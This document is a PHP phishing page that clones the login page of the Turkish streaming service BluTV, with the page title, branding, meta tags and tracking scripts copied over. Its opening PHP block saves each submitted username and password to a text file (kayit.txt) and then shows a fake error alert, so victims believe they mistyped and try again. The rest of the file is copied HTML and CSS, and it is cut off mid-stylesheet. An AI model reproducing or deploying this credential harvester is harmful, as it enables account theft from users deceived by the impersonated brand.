
<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {

$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n __________________ \nUsername: ".$username."\nPassword: ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}
 ?>

<html lang="tr" dir="ltr" prefix="og: http://ogp.me/ns#"><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><style class="vjs-styles-defaults">
      .video-js {
        width: 300px;
        height: 150px;
      }

      .vjs-fluid {
        padding-top: 56.25%
      }
    </style>
		<base href="/">
		<meta charset="utf-8">
		<meta http-equiv="x-dns-prefetch-control" content="off">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
		<meta name="fragment" content="*">
		<meta name="theme_color" content="#232530">

		<!-- Metadata -->

		<title>BluTV Giriş</title>
		<link href="http://www.blutv.com.tr/" rel="alternate" hreflang="tr-TR">

		<link rel="canonical" href="https://www.blutv.com.tr/">
		
		
		<meta name="keywords" content="">
		<meta name="description" content="Blutv ile yerli-yabancı filmler ve dizileri, canlı yayınları, belgeselleri ve BluTV özel yapımlarını HD kalitesiyle bilgisayar, telefon ve Smart TV'den izle!">
		<meta name="msapplication-TileColor" content="#000">
		<meta name="msapplication-TileImage" content="https://blutv-objects.mncdn.com/assets/images/favicon/ms-icon-144x144.png?v=400">
		
			<meta property="og:title" content="BluTV">
			<meta property="og:site_name" content="blutv">
			<meta property="og:description" content="Blutv ile yerli-yabancı filmler ve dizileri, canlı yayınları, belgeselleri ve BluTV özel yapımlarını HD kalitesiyle bilgisayar, telefon ve Smart TV'den izle!">
			<meta property="og:image" content="https://blutv-objects.mncdn.com/assets/images/blutv.jpg?v=400">
			<meta property="og:image:type" content="image/jpeg">
			<meta property="og:image:width" content="1024">
			<meta property="og:image:height" content="535">
			<meta property="og:type" content="website">
		
			<!-- Smart Banner -->
					<meta name="smartbanner:title" content="BluTV">
			<meta name="smartbanner:author" content="BluTV İletişim ve Dijital Yayın">
			<meta name="smartbanner:price" content="Ücretsiz">
			<meta name="smartbanner:price-suffix-apple" content=" - App Store">
			<meta name="smartbanner:price-suffix-google" content=" - Google Play">
			<meta name="smartbanner:button" content="İndir">
			<meta name="smartbanner:icon-apple" content="https://blutv-objects.mncdn.com/assets/images/app_logo.png?v=400">
			<meta name="smartbanner:icon-google" content="https://blutv-objects.mncdn.com/assets/images/app_logo.png?v=400">

					<meta name="apple-itunes-app" content="app-id=647214190">
			<meta name="smartbanner:button-url-apple" content="https://itunes.apple.com/tr/app/blutv/id647214190?mt=8">
		
			<meta name="smartbanner:button-url-google" content="https://play.google.com/store/apps/details?id=com.dsmart.blu.android">
			<meta name="smartbanner:enabled-platforms" content="android">
			<meta name="smartbanner:disable-positioning" content="true">
			<meta name="smartbanner:hide-ttl" content="10000">
			<meta name="smartbanner:hide-path" content="/">
				<!-- Smart Banner -->

		<link rel="android-touch-icon" href="https://blutv-objects.mncdn.com/assets/images/favicon/apple-icon-57x57.png?v=400">
		<link rel="apple-touch-icon" sizes="57x57" href="https://blutv-objects.mncdn.com/assets/images/favicon/apple-icon-57x57.png?v=400">

		<link rel="apple-touch-icon" sizes="60x60" href="https://blutv-objects.mncdn.com/assets/images/favicon/apple-icon-60x60.png?v=400">
		<link rel="apple-touch-icon" sizes="72x72" href="https://blutv-objects.mncdn.com/assets/images/favicon/apple-icon-72x72.png?v=400">
		<link rel="apple-touch-icon" sizes="76x76" href="https://blutv-objects.mncdn.com/assets/images/favicon/apple-icon-76x76.png?v=400">
		<link rel="apple-touch-icon" sizes="114x114" href="https://blutv-objects.mncdn.com/assets/images/favicon/apple-icon-114x114.png?v=400">
		<link rel="apple-touch-icon" sizes="120x120" href="https://blutv-objects.mncdn.com/assets/images/favicon/apple-icon-120x120.png?v=400">
		<link rel="apple-touch-icon" sizes="144x144" href="https://blutv-objects.mncdn.com/assets/images/favicon/apple-icon-144x144.png?v=400">
		<link rel="apple-touch-icon" sizes="152x152" href="https://blutv-objects.mncdn.com/assets/images/favicon/apple-icon-152x152.png?v=400">
		<link rel="apple-touch-icon" sizes="180x180" href="https://blutv-objects.mncdn.com/assets/images/favicon/apple-icon-180x180.png?v=400">
		<link rel="icon" type="image/png" sizes="192x192" href="https://blutv-objects.mncdn.com/assets/images/favicon/android-icon-192x192.png?v=400">
		<link rel="icon" type="image/png" sizes="32x32" href="https://blutv-objects.mncdn.com/assets/images/favicon/favicon-32x32.png?v=400">
		<link rel="icon" type="image/png" sizes="96x96" href="https://blutv-objects.mncdn.com/assets/images/favicon/favicon-96x96.png?v=400">
		<link rel="icon" type="image/png" sizes="16x16" href="https://blutv-objects.mncdn.com/assets/images/favicon/favicon-16x16.png?v=400">
		<link rel="manifest" href="https://blutv-objects.mncdn.com/assets/images/favicon/manifest.json?v=400">

		<link rel="dns-prefetch" href="https://gum.criteo.com">
		<link rel="dns-prefetch" href="https://widget.criteo.com">
		<link rel="dns-prefetch" href="https://static.criteo.net">
		<link rel="dns-prefetch" href="https://dis.eu.criteo.com">
		<link rel="dns-prefetch" href="https://sslwidget.criteo.com">
		<link rel="dns-prefetch" href="https://widget.eu.criteo.com">
		<link rel="dns-prefetch" href="https://dev.visualwebsiteoptimizer.com">
		<link rel="dns-prefetch" href="https://script.hotjar.com">
		<link rel="dns-prefetch" href="https://static.hotjar.com">
		<link rel="dns-prefetch" href="https://cdn.heapanalytics.com">
		<link rel="dns-prefetch" href="https://analytics.twitter.com">
		<link rel="dns-prefetch" href="https://vars.hotjar.com">
		<link rel="dns-prefetch" href="https://in.hotjar.com">
		<link rel="dns-prefetch" href="https://s.dogannet.tv">
		<link rel="dns-prefetch" href="https://connect.facebook.net">
		<link rel="dns-prefetch" href="https://track.adform.net">
		<link rel="dns-prefetch" href="https://stats.blutv.com">
		<link rel="dns-prefetch" href="https://platform.twitter.com">
		<link rel="dns-prefetch" href="https://tracker.blutv.com">
		<link rel="dns-prefetch" href="https://www.gstatic.com">
		<link rel="dns-prefetch" href="https://www.googleadservices.com">
		<link rel="dns-prefetch" href="https://c.supert.ag">
		<link rel="dns-prefetch" href="https://static.ads-twitter.com">
		<link rel="dns-prefetch" href="https://vsh.visilabs.net">
		<link rel="dns-prefetch" href="https://rt.visilabs.net">
		<link rel="dns-prefetch" href="https://lgr.visilabs.net">

					<script type="text/javascript" async="" src="https://www.google-analytics.com/gtm/js?id=GTM-TQZRWB&amp;t=gtm6&amp;cid=1720554398.1557770115"></script><script src="https://connect.facebook.net/signals/plugins/inferredEvents.js?v=2.8.47" async=""></script><script src="https://connect.facebook.net/signals/config/1612708812183031?v=2.8.47&amp;r=stable" async=""></script><script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" async="" src="//static.hotjar.com/c/hotjar-160400.js?sv=5"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-PH2G8V"></script><script type="text/javascript" async="" src="https://www.googleadservices.com/pagead/conversion_async.js"></script><script async="" src="//c.supert.ag/p/0002f2/supertag-code-v5.js"></script><script type="text/javascript" src="https://blutv-objects.mncdn.com/assets/js/blutv.min.js?v=400" async=""></script><script type="text/javascript" src="//static.criteo.net/js/ld/ld.js" async=""></script><script type="text/javascript" src="//c.supert.ag/p/0002f2/supertag.js" async=""></script><script type="text/javascript" src="//static.ads-twitter.com/oct.js" async=""></script><script async="" src="//static.ads-twitter.com/uwt.js"></script><script type="text/javascript" async="" src="https://cdn.heapanalytics.com/js/heap-2073344115.js"></script><script type="text/javascript" async="" src="https://track.adform.net/serving/scripts/trackpoint/async/"></script><script async="" src="https://tracker.blutv.com/track.js?v=1"></script><script type="text/javascript" src="https://blutv-objects.mncdn.com/assets/js/plugins/react.production.min.js?v=400" crossorigin=""></script>
			<script type="text/javascript" src="https://blutv-objects.mncdn.com/assets/js/plugins/react-dom.production.min.js?v=400" crossorigin=""></script>
		
		<!-- Events -->
		<script type="text/javascript">
			if (window.addEventListener) {
				window.addEventListener("message", onMessage, false);
			} else if(window.attachEvent) {
				window.attachEvent("onmessage", onMessage, false);
			};
			function onMessage(event) {
				var data = event.data;
				if (typeof(window[data.func]) === "function") {
					window[data.func].call(null, data.message);
				};
			};
			function setIframeHeight(iframeHeight){
				$("#iframePayguru").height(iframeHeight + 'px');
			};
		</script>

		<script>
      /*loadCss*/
      //!function(w){"use strict";var loadCSS=function(href,before,media){function ready(cb){return doc.body?cb():void setTimeout(function(){ready(cb)})}function loadCB(){ss.addEventListener&&ss.removeEventListener("load",loadCB),ss.media=media||"all"}var ref,doc=w.document,ss=doc.createElement("link");if(before)ref=before;else{var refs=(doc.body||doc.getElementsByTagName("head")[0]).childNodes;ref=refs[refs.length-1]}var sheets=doc.styleSheets;ss.rel="stylesheet",ss.href=href,ss.media="only x",ready(function(){ref.parentNode.insertBefore(ss,before?ref:ref.nextSibling)});var onloadcssdefined=function(cb){for(var resolvedHref=ss.href,i=sheets.length;i--;)if(sheets[i].href===resolvedHref)return cb();setTimeout(function(){onloadcssdefined(cb)})};return ss.addEventListener&&ss.addEventListener("load",loadCB),ss.onloadcssdefined=onloadcssdefined,onloadcssdefined(loadCB),ss};"undefined"!=typeof exports?exports.loadCSS=loadCSS:w.loadCSS=loadCSS}("undefined"!=typeof global?global:this);

      /*link[rel=preload] polyfill*/
      //!function(w){if(w.loadCSS){var rp=loadCSS.relpreload={};if(rp.support=function(){try{return w.document.createElement("link").relList.supports("preload")}catch(e){return!1}},rp.poly=function(){for(var links=w.document.getElementsByTagName("link"),i=0;i<links.length;i++){var link=links[i];"preload"===link.rel&&"style"===link.getAttribute("as")&&(w.loadCSS(link.href,link),link.rel=null)}},!rp.support()){rp.poly();var run=w.setInterval(rp.poly,300);w.addEventListener&&w.addEventListener("load",function(){w.clearInterval(run)}),w.attachEvent&&w.attachEvent("onload",function(){w.clearInterval(run)})}}}(this);
		</script>
	<style type="text/css">._1BdC5vIxfbXIJvcgteY_KW, ._1BdC5vIxfbXIJvcgteY_KW._2AcGFadZAf3QMV3_fJebP9, ._1BdC5vIxfbXIJvcgteY_KW._3iEek4bUdWbxBm5a81ppG7 {
  position: relative;
  font-family: 'Work Sans', sans-serif;
  min-width: 180px;
  height: 45px;
  border-radius: 3px;
  border: none;
  font-size: 18px;
  font-weight: 600;
  letter-spacing: normal;
  transition: all .1s ease-in-out;
  margin-right: 20px;
  box-sizing: border-box;
  padding-left: 28px;
  padding-right: 28px; }
  ._1BdC5vIxfbXIJvcgteY_KW:last-child {
    margin-right: 0; }
  ._1BdC5vIxfbXIJvcgteY_KW:focus {
    outline: 0; }
  ._1BdC5vIxfbXIJvcgteY_KW:not(:disabled):not(._1tpICLubuGussr0B5SveYf) {
    cursor: pointer; }
  ._1BdC5vIxfbXIJvcgteY_KW ._3xuh6CpZQH0lvcbV6yRBjx {
    position: relative;
    display: -webkit-inline-flex;
    display: inline-flex;
    z-index: 1; }
    ._1BdC5vIxfbXIJvcgteY_KW ._3xuh6CpZQH0lvcbV6yRBjx._2oPpCasVq2jxZJpGD2dK76 {
      border-bottom: 2px dashed; }
  ._2AcGFadZAf3QMV3_fJebP9._1BdC5vIxfbXIJvcgteY_KW {
    color: #FFFFFF;
    background-color: rgba(255, 255, 255, 0.1); }
    ._2AcGFadZAf3QMV3_fJebP9.cimvRZXbZovdpjEKj2-ac._1BdC5vIxfbXIJvcgteY_KW, ._2AcGFadZAf3QMV3_fJebP9._1BdC5vIxfbXIJvcgteY_KW:hover, ._2AcGFadZAf3QMV3_fJebP9._1BdC5vIxfbXIJvcgteY_KW:active {
      color: #232530;
      background-color: #FFFFFF; }
    ._2AcGFadZAf3QMV3_fJebP9._1BdC5vIxfbXIJvcgteY_KW .xhbwF6mVaf_c8L6JAxjuu {
      position: absolute;
      left: 0;
      top: 0;
      height: 100%;
      background-color: #ebebeb;
      border-radius: 3px;
      z-index: 0; }
  ._1BdC5vIxfbXIJvcgteY_KW._3aVqb81flMkCXIBsbx8ufI {
    min-width: auto;
    height: auto;
    padding: 0;
    border: none;
    background: transparent; }
  ._1BdC5vIxfbXIJvcgteY_KW._1WwR988nKTUnl0gIWeDiS- {
    display: -webkit-flex;
    display: flex;
    -webkit-align-items: center;
    align-items: center;
    -webkit-justify-content: center;
    justify-content: center;
    border-radius: 50%;
    background-color: #24262F;
    width: 45px;
    height: 45px;
    min-width: auto;
    margin-right: 10px;
    padding: 0 14px; }
    ._1BdC5vIxfbXIJvcgteY_KW._1WwR988nKTUnl0gIWeDiS-:hover {
      background-color: #549FF8; }
  ._3iEek4bUdWbxBm5a81ppG7._1BdC5vIxfbXIJvcgteY_KW {
    display: -webkit-flex;
    display: flex;
    min-width: auto;
    height: auto;
    border-radius: 0;
    background-color: transparent;
    padding: 0; }
</style><style type="text/css">/**
 * Swiper 4.5.0
 * Most modern mobile touch slider and framework with hardware accelerated transitions
 * http://www.idangero.us/swiper/
 *
 * Copyright 2014-2019 Vladimir Kharlampidi
 *
 * Released under the MIT License
 *
 * Released on: February 22, 2019
 */
.swiper-container{margin:0 auto;position:relative;overflow:hidden;list-style:none;padding:0;z-index:1}.swiper-container-no-flexbox .swiper-slide{float:left}.swiper-container-vertical>.swiper-wrapper{-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column}.swiper-wrapper{position:relative;width:100%;height:100%;z-index:1;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-transition-property:-webkit-transform;transition-property:-webkit-transform;-o-transition-property:transform;transition-property:transform;transition-property:transform,-webkit-transform;-webkit-box-sizing:content-box;box-sizing:content-box}.swiper-container-android .swiper-slide,.swiper-wrapper{-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0)}.swiper-container-multirow>.swiper-wrapper{-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap}.swiper-container-free-mode>.swiper-wrapper{-webkit-transition-timing-function:ease-out;-o-transition-timing-function:ease-out;transition-timing-function:ease-out;margin:0 auto}.swiper-slide{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;width:100%;height:100%;position:relative;-webkit-transition-property:-webkit-transform;transition-property:-webkit-transform;-o-transition-property:transform;transition-property:transform;transition-property:transform,-webkit-transform}.swiper-slide-invisible-blank{visibility:hidden}.swiper-container-autoheight,.swiper-container-autoheight .swiper-slide{height:auto}.swiper-container-autoheight .swiper-wrapper{-webkit-box-align:start;-webkit-align-items:flex-start;-ms-flex-align:start;align-items:flex-start;-webkit-transition-property:height,-webkit-transform;transition-property:height,-webkit-transform;-o-transition-property:transform,height;transition-property:transform,height;transition-property:transform,height,-webkit-transform}.swiper-container-3d{-webkit-perspective:1200px;perspective:1200px}.swiper-container-3d .swiper-cube-shadow,.swiper-container-3d .swiper-slide,.swiper-container-3d .swiper-slide-shadow-bottom,.swiper-container-3d .swiper-slide-shadow-left,.swiper-container-3d .swiper-slide-shadow-right,.swiper-container-3d .swiper-slide-shadow-top,.swiper-container-3d .swiper-wrapper{-webkit-transform-style:preserve-3d;transform-style:preserve-3d}.swiper-container-3d .swiper-slide-shadow-bottom,.swiper-container-3d .swiper-slide-shadow-left,.swiper-container-3d .swiper-slide-shadow-right,.swiper-container-3d .swiper-slide-shadow-top{position:absolute;left:0;top:0;width:100%;height:100%;pointer-events:none;z-index:10}.swiper-container-3d .swiper-slide-shadow-left{background-image:-webkit-gradient(linear,right top,left top,from(rgba(0,0,0,.5)),to(rgba(0,0,0,0)));background-image:-webkit-linear-gradient(right,rgba(0,0,0,.5),rgba(0,0,0,0));background-image:-o-linear-gradient(right,rgba(0,0,0,.5),rgba(0,0,0,0));background-image:linear-gradient(to left,rgba(0,0,0,.5),rgba(0,0,0,0))}.swiper-container-3d .swiper-slide-shadow-right{background-image:-webkit-gradient(linear,left top,right top,from(rgba(0,0,0,.5)),to(rgba(0,0,0,0)));background-image:-webkit-linear-gradient(left,rgba(0,0,0,.5),rgba(0,0,0,0));background-image:-o-linear-gradient(left,rgba(0,0,0,.5),rgba(0,0,0,0));background-image:linear-gradient(to right,rgba(0,0,0,.5),rgba(0,0,0,0))}.swiper-container-3d .swiper-slide-shadow-top{background-image:-webkit-gradient(linear,left bottom,left top,from(rgba(0,0,0,.5)),to(rgba(0,0,0,0)));background-image:-webkit-linear-gradient(bottom,rgba(0,0,0,.5),rgba(0,0,0,0));background-image:-o-linear-gradient(bottom,rgba(0,0,0,.5),rgba(0,0,0,0));background-image:linear-gradient(to top,rgba(0,0,0,.5),rgba(0,0,0,0))}.swiper-container-3d .swiper-slide-shadow-bottom{background-image:-webkit-gradient(linear,left top,left bottom,from(rgba(0,0,0,.5)),to(rgba(0,0,0,0)));background-image:-webkit-linear-gradient(top,rgba(0,0,0,.5),rgba(0,0,0,0));background-image:-o-linear-gradient(top,rgba(0,0,0,.5),rgba(0,0,0,0));background-image:linear-gradient(to bottom,rgba(0,0,0,.5),rgba(0,0,0,0))}.swiper-container-wp8-horizontal,.swiper-container-wp8-horizontal>.swiper-wrapper{-ms-touch-action:pan-y;touch-action:pan-y}.swiper-container-wp8-vertical,.swiper-container-wp8-vertical>.swiper-wrapper{-ms-touch-action:pan-x;touch-action:pan-x}.swiper-button-next,.swiper-button-prev{position:absolute;top:50%;width:27px;height:44px;margin-top:-22px;z-index:10;cursor:pointer;background-size:27px 44px;background-position:center;background-repeat:no-repeat}.swiper-button-next.swiper-button-disabled,.swiper-button-prev.swiper-button-disabled{opacity:.35;cursor:auto;pointer-events:none}.swiper-button-prev,.swiper-container-rtl .swiper-button-next{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%20viewBox%3D'0%200%2027%2044'%3E%3Cpath%20d%3D'M0%2C22L22%2C0l2.1%2C2.1L4.2%2C22l19.9%2C19.9L22%2C44L0%2C22L0%2C22L0%2C22z'%20fill%3D'%23007aff'%2F%3E%3C%2Fsvg%3E");left:10px;right:auto}.swiper-button-next,.swiper-container-rtl .swiper-button-prev{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%20viewBox%3D'0%200%2027%2044'%3E%3Cpath%20d%3D'M27%2C22L27%2C22L5%2C44l-2.1-2.1L22.8%2C22L2.9%2C2.1L5%2C0L27%2C22L27%2C22z'%20fill%3D'%23007aff'%2F%3E%3C%2Fsvg%3E");right:10px;left:auto}.swiper-button-prev.swiper-button-white,.swiper-container-rtl .swiper-button-next.swiper-button-white{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%20viewBox%3D'0%200%2027%2044'%3E%3Cpath%20d%3D'M0%2C22L22%2C0l2.1%2C2.1L4.2%2C22l19.9%2C19.9L22%2C44L0%2C22L0%2C22L0%2C22z'%20fill%3D'%23ffffff'%2F%3E%3C%2Fsvg%3E")}.swiper-button-next.swiper-button-white,.swiper-container-rtl .swiper-button-prev.swiper-button-white{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%20viewBox%3D'0%200%2027%2044'%3E%3Cpath%20d%3D'M27%2C22L27%2C22L5%2C44l-2.1-2.1L22.8%2C22L2.9%2C2.1L5%2C0L27%2C22L27%2C22z'%20fill%3D'%23ffffff'%2F%3E%3C%2Fsvg%3E")}.swiper-button-prev.swiper-button-black,.swiper-container-rtl .swiper-button-next.swiper-button-black{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%20viewBox%3D'0%200%2027%2044'%3E%3Cpath%20d%3D'M0%2C22L22%2C0l2.1%2C2.1L4.2%2C22l19.9%2C19.9L22%2C44L0%2C22L0%2C22L0%2C22z'%20fill%3D'%23000000'%2F%3E%3C%2Fsvg%3E")}.swiper-button-next.swiper-button-black,.swiper-container-rtl .swiper-button-prev.swiper-button-black{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%20viewBox%3D'0%200%2027%2044'%3E%3Cpath%20d%3D'M27%2C22L27%2C22L5%2C44l-2.1-2.1L22.8%2C22L2.9%2C2.1L5%2C0L27%2C22L27%2C22z'%20fill%3D'%23000000'%2F%3E%3C%2Fsvg%3E")}.swiper-button-lock{display:none}.swiper-pagination{position:absolute;text-align:center;-webkit-transition:.3s opacity;-o-transition:.3s opacity;transition:.3s opacity;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0);z-index:10}.swiper-pagination.swiper-pagination-hidden{opacity:0}.swiper-container-horizontal>.swiper-pagination-bullets,.swiper-pagination-custom,.swiper-pagination-fraction{bottom:10px;left:0;width:100%}.swiper-pagination-bullets-dynamic{overflow:hidden;font-size:0}.swiper-pagination-bullets-dynamic .swiper-pagination-bullet{-webkit-transform:scale(.33);-ms-transform:scale(.33);transform:scale(.33);position:relative}.swiper-pagination-bullets-dynamic .swiper-pagination-bullet-active{-webkit-transform:scale(1);-ms-transform:scale(1);transform:scale(1)}.swiper-pagination-bullets-dynamic .swiper-pagination-bullet-active-main{-webkit-transform:scale(1);-ms-transform:scale(1);transform:scale(1)}.swiper-pagination-bullets-dynamic .swiper-pagination-bullet-active-prev{-webkit-transform:scale(.66);-ms-transform:scale(.66);transform:scale(.66)}.swiper-pagination-bullets-dynamic .swiper-pagination-bullet-active-prev-prev{-webkit-transform:scale(.33);-ms-transform:scale(.33);transform:scale(.33)}.swiper-pagination-bullets-dynamic .swiper-pagination-bullet-active-next{-webkit-transform:scale(.66);-ms-transform:scale(.66);transform:scale(.66)}.swiper-pagination-bullets-dynamic .swiper-pagination-bullet-active-next-next{-webkit-transform:scale(.33);-ms-transform:scale(.33);transform:scale(.33)}.swiper-pagination-bullet{width:8px;height:8px;display:inline-block;border-radius:100%;background:#000;opacity:.2}button.swiper-pagination-bullet{border:none;margin:0;padding:0;-webkit-box-shadow:none;box-shadow:none;-webkit-appearance:none;-moz-appearance:none;appearance:none}.swiper-pagination-clickable .swiper-pagination-bullet{cursor:pointer}.swiper-pagination-bullet-active{opacity:1;background:#007aff}.swiper-container-vertical>.swiper-pagination-bullets{right:10px;top:50%;-webkit-transform:translate3d(0,-50%,0);transform:translate3d(0,-50%,0)}.swiper-container-vertical>.swiper-pagination-bullets .swiper-pagination-bullet{margin:6px 0;display:block}.swiper-container-vertical>.swiper-pagination-bullets.swiper-pagination-bullets-dynamic{top:50%;-webkit-transform:translateY(-50%);-ms-transform:translateY(-50%);transform:translateY(-50%);width:8px}.swiper-container-vertical>.swiper-pagination-bullets.swiper-pagination-bullets-dynamic .swiper-pagination-bullet{display:inline-block;-webkit-transition:.2s top,.2s -webkit-transform;transition:.2s top,.2s -webkit-transform;-o-transition:.2s transform,.2s top;transition:.2s transform,.2s top;transition:.2s transform,.2s top,.2s -webkit-transform}.swiper-container-horizontal>.swiper-pagination-bullets .swiper-pagination-bullet{margin:0 4px}.swiper-container-horizontal>.swiper-pagination-bullets.swiper-pagination-bullets-dynamic{left:50%;-webkit-transform:translateX(-50%);-ms-transform:translateX(-50%);transform:translateX(-50%);white-space:nowrap}.swiper-container-horizontal>.swiper-pagination-bullets.swiper-pagination-bullets-dynamic .swiper-pagination-bullet{-webkit-transition:.2s left,.2s -webkit-transform;transition:.2s left,.2s -webkit-transform;-o-transition:.2s transform,.2s left;transition:.2s transform,.2s left;transition:.2s transform,.2s left,.2s -webkit-transform}.swiper-container-horizontal.swiper-container-rtl>.swiper-pagination-bullets-dynamic .swiper-pagination-bullet{-webkit-transition:.2s right,.2s -webkit-transform;transition:.2s right,.2s -webkit-transform;-o-transition:.2s transform,.2s right;transition:.2s transform,.2s right;transition:.2s transform,.2s right,.2s -webkit-transform}.swiper-pagination-progressbar{background:rgba(0,0,0,.25);position:absolute}.swiper-pagination-progressbar .swiper-pagination-progressbar-fill{background:#007aff;position:absolute;left:0;top:0;width:100%;height:100%;-webkit-transform:scale(0);-ms-transform:scale(0);transform:scale(0);-webkit-transform-origin:left top;-ms-transform-origin:left top;transform-origin:left top}.swiper-container-rtl .swiper-pagination-progressbar .swiper-pagination-progressbar-fill{-webkit-transform-origin:right top;-ms-transform-origin:right top;transform-origin:right top}.swiper-container-horizontal>.swiper-pagination-progressbar,.swiper-container-vertical>.swiper-pagination-progressbar.swiper-pagination-progressbar-opposite{width:100%;height:4px;left:0;top:0}.swiper-container-horizontal>.swiper-pagination-progressbar.swiper-pagination-progressbar-opposite,.swiper-container-vertical>.swiper-pagination-progressbar{width:4px;height:100%;left:0;top:0}.swiper-pagination-white .swiper-pagination-bullet-active{background:#fff}.swiper-pagination-progressbar.swiper-pagination-white{background:rgba(255,255,255,.25)}.swiper-pagination-progressbar.swiper-pagination-white .swiper-pagination-progressbar-fill{background:#fff}.swiper-pagination-black .swiper-pagination-bullet-active{background:#000}.swiper-pagination-progressbar.swiper-pagination-black{background:rgba(0,0,0,.25)}.swiper-pagination-progressbar.swiper-pagination-black .swiper-pagination-progressbar-fill{background:#000}.swiper-pagination-lock{display:none}.swiper-scrollbar{border-radius:10px;position:relative;-ms-touch-action:none;background:rgba(0,0,0,.1)}.swiper-container-horizontal>.swiper-scrollbar{position:absolute;left:1%;bottom:3px;z-index:50;height:5px;width:98%}.swiper-container-vertical>.swiper-scrollbar{position:absolute;right:3px;top:1%;z-index:50;width:5px;height:98%}.swiper-scrollbar-drag{height:100%;width:100%;position:relative;background:rgba(0,0,0,.5);border-radius:10px;left:0;top:0}.swiper-scrollbar-cursor-drag{cursor:move}.swiper-scrollbar-lock{display:none}.swiper-zoom-container{width:100%;height:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;text-align:center}.swiper-zoom-container>canvas,.swiper-zoom-container>img,.swiper-zoom-container>svg{max-width:100%;max-height:100%;-o-object-fit:contain;object-fit:contain}.swiper-slide-zoomed{cursor:move}.swiper-lazy-preloader{width:42px;height:42px;position:absolute;left:50%;top:50%;margin-left:-21px;margin-top:-21px;z-index:10;-webkit-transform-origin:50%;-ms-transform-origin:50%;transform-origin:50%;-webkit-animation:swiper-preloader-spin 1s steps(12,end) infinite;animation:swiper-preloader-spin 1s steps(12,end) infinite}.swiper-lazy-preloader:after{display:block;content:'';width:100%;height:100%;background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg%20viewBox%3D'0%200%20120%20120'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%20xmlns%3Axlink%3D'http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink'%3E%3Cdefs%3E%3Cline%20id%3D'l'%20x1%3D'60'%20x2%3D'60'%20y1%3D'7'%20y2%3D'27'%20stroke%3D'%236c6c6c'%20stroke-width%3D'11'%20stroke-linecap%3D'round'%2F%3E%3C%2Fdefs%3E%3Cg%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.27'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.27'%20transform%3D'rotate(30%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.27'%20transform%3D'rotate(60%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.27'%20transform%3D'rotate(90%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.27'%20transform%3D'rotate(120%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.27'%20transform%3D'rotate(150%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.37'%20transform%3D'rotate(180%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.46'%20transform%3D'rotate(210%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.56'%20transform%3D'rotate(240%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.66'%20transform%3D'rotate(270%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.75'%20transform%3D'rotate(300%2060%2C60)'%2F%3E%3Cuse%20xlink%3Ahref%3D'%23l'%20opacity%3D'.85'%20transform%3D'rotate(330%2060%2C60)'%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E");background-position:50%;background-size:100%;background-repeat:no-repeat}.swiper-lazy-preloader-white:after{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg%20viewBox%3D'0%200%20120%20120'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%20xmlns%3Axlink%3D'http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink'%3E%3Cdefs%3E%3Cline%20id%3D'l'%20x1%3D'60'%20x2%3D'60'%20y1%3D'7'%20y2%3D'27'%20stroke%3D'%23fff'%20stroke-width%3D'